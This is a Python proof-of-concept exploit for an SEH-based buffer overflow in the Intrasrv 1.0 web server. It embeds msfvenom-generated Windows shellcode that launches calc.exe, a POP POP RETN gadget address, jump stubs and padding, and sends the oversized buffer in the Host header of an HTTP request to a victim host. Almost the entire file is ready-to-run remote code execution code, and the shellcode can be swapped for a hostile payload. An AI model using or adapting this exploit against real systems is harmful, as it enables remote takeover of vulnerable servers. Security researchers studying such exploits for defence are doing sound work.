#!/usr/bin/python

import socket
from struct import *

victim_host = "10.0.0.17"
victim_port = 80

# msfvenom -p windows/exec CMD=calc.exe -b "\x00\xff\x0d\x0a" EXITFUNC=thread -f python -v shellcode_calc
shellcode_calc =  ""
shellcode_calc += "\xba\x97\x92\x8c\xa9\xda\xd2\xd9\x74\x24"
shellcode_calc += "\xf4\x5f\x2b\xc9\xb1\x31\x31\x57\x13\x83"
shellcode_calc += "\xc7\x04\x03\x57\x98\x70\x79\x55\x4e\xf6"
shellcode_calc += "\x82\xa6\x8e\x97\x0b\x43\xbf\x97\x68\x07"
shellcode_calc += "\xef\x27\xfa\x45\x03\xc3\xae\x7d\x90\xa1"
shellcode_calc += "\x66\x71\x11\x0f\x51\xbc\xa2\x3c\xa1\xdf"
shellcode_calc += "\x20\x3f\xf6\x3f\x19\xf0\x0b\x41\x5e\xed"
shellcode_calc += "\xe6\x13\x37\x79\x54\x84\x3c\x37\x65\x2f"
shellcode_calc += "\x0e\xd9\xed\xcc\xc6\xd8\xdc\x42\x5d\x83"
shellcode_calc += "\xfe\x65\xb2\xbf\xb6\x7d\xd7\xfa\x01\xf5"
shellcode_calc += "\x23\x70\x90\xdf\x7a\x79\x3f\x1e\xb3\x88"
shellcode_calc += "\x41\x66\x73\x73\x34\x9e\x80\x0e\x4f\x65"
shellcode_calc += "\xfb\xd4\xda\x7e\x5b\x9e\x7d\x5b\x5a\x73"
shellcode_calc += "\x1b\x28\x50\x38\x6f\x76\x74\xbf\xbc\x0c"
shellcode_calc += "\x80\x34\x43\xc3\x01\x0e\x60\xc7\x4a\xd4"
shellcode_calc += "\x09\x5e\x36\xbb\x36\x80\x99\x64\x93\xca"
shellcode_calc += "\x37\x70\xae\x90\x5d\x87\x3c\xaf\x13\x87"
shellcode_calc += "\x3e\xb0\x03\xe0\x0f\x3b\xcc\x77\x90\xee"
shellcode_calc += "\xa9\x98\x72\x3b\xc7\x30\x2b\xae\x6a\x5d"
shellcode_calc += "\xcc\x04\xa8\x58\x4f\xad\x50\x9f\x4f\xc4"
shellcode_calc += "\x55\xdb\xd7\x34\x27\x74\xb2\x3a\x94\x75"
shellcode_calc += "\x97\x58\x7b\xe6\x7b\xb1\x1e\x8e\x1e\xcd"

# SEH handler overwritten with - 43336143
# [*] Exact match at offset 1569
# Log data, item 23
# Address=0BADF00D
# Message = SEH record (nseh field) at 0x0018ff78 overwritten with normal pa$

nseh_stage1 = "\x90\x90\xEB\xF6" # JMP back 10 bytes
jmp450_stage2 = "\x90\x90\x90\xE9\x3E\xFE\xFF\xFF" # Have it hit our long jump back 450
seh_handler = pack('<L', 0x004097dd) # our POP POP RETN from intrasrv.exe

# 0x004097dd : pop eax # pop ebp # ret  | startnull {PAGE_EXECUTE_READ} [intrasrv.exe]
# ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\john\Desktop\intrasrv.exe)

exploit_payload = "A" * (1553 - len(shellcode_calc) - 8) + shellcode_calc
exploit_payload += jmp450_stage2
exploit_payload += nseh_stage1
exploit_payload += seh_handler
exploit_payload += "A" * (4000 - len(exploit_payload))

http_request  = "HEAD / HTTP/1.1\r\n"
http_request += "Host:" + exploit_payload + "\r\n"
http_request += "User-Agent: firefox \r\n"
http_request += "If-Modified-Since: Wed \r\n\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

try:
	print("[*] Intrasrv webserver 1.0 SEH overflow POC\n")
	expl.connect((victim_host, victim_port))
	print("[*] Establishing a connection to the vicitm")
	expl.send(http_request)
	print("[*] Sending the payload")
	expl.close()
	print("[*] Watch for a spawned calc")
except:
	print("[!] Exploit failed to send")

